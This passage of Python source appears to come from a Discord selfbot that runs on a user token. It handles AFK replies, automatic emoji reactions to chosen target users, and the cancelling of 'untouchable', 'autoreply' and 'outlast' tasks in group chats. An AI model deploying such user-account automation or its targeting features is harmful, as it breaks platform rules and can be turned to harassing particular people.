            guild_id = message.guild.id if message.guild else '@me'
            msg_link = f"https://discord.com/channels/{guild_id}/{message.channel.id}/{message.id}"
            
            if user_id in afk_messages:
                afk_messages[user_id].append(msg_link)
                
            try:
                afk_time = afk_users[user_id]
                time_afk = datetime.now() - afk_time
                hours = time_afk.seconds // 3600
                minutes = (time_afk.seconds % 3600) // 60
                print(f"{Fore.GREEN}[SUCCESS] Sent AFK reply for {user.name} (AFK for {hours}h {minutes}m)")
            except Exception as e:
                print(f"{Fore.RED}[ERROR] Failed to send AFK reply: {str(e)}")

    if message.author.id in auto_react_targets:
        try:
            emoji = auto_react_targets[message.author.id]
            await message.add_reaction(emoji)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to auto-react: {str(e)}")
    
    if message.author.id in alt_react_targets:
        try:
            emoji_list, current_index = alt_react_targets[message.author.id]
            await message.add_reaction(emoji_list[current_index])
            
            next_index = (current_index + 1) % len(emoji_list)
            alt_react_targets[message.author.id][1] = next_index
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to alt-react: {str(e)}")
    
    await bot.process_commands(message)
@bot.event
async def on_group_remove(channel, user):
    if not isinstance(channel, discord.GroupChannel):
        return

    try:
        channel_id = channel.id
        user_id = user.id

        if channel_id in untouchable_tasks and untouchable_tasks[channel_id]:
            try:
                for task in untouchable_tasks[channel_id]:
                    if not task.done():
                        task.cancel()
                del untouchable_tasks[channel_id]
                if channel_id in gc_name_counter:
                    del gc_name_counter[channel_id]
                print(f"{Fore.GREEN}[SUCCESS] Stopped untouchable for {user.name} (left group)")
            except Exception as e:
                print(f"{Fore.RED}[ERROR] Failed to stop untouchable: {str(e)}")

        if user_id in autoreply_tasks:
            try:
                task = autoreply_tasks[user_id]
                if not task.done():
                    task.cancel()
                del autoreply_tasks[user_id]
                print(f"{Fore.GREEN}[SUCCESS] Stopped AR for {user.name} (left group)")
            except Exception as e:
                print(f"{Fore.RED}[ERROR] Failed to stop AR: {str(e)}")

        if channel_id in outlast_tasks:
            try:
                tasks_to_remove = []
                for task_key, task in outlast_tasks.items():
                    if task_key[1] == channel_id and not task.done():
                        task.cancel()
                        tasks_to_remove.append(task_key)
                
                for key in tasks_to_remove:
                    outlast_tasks.pop(key)
                print(f"{Fore.GREEN}[SUCCESS] Stopped outlast in channel (user left)")
            except Exception as e:
                print(f"{Fore.RED}[ERROR] Failed to stop outlast: {str(e)}")

    except Exception as e:
        print(f"{Fore.RED}[ERROR] Error in on_group_remove: {str(e)}")



bot.run(token, bot=False)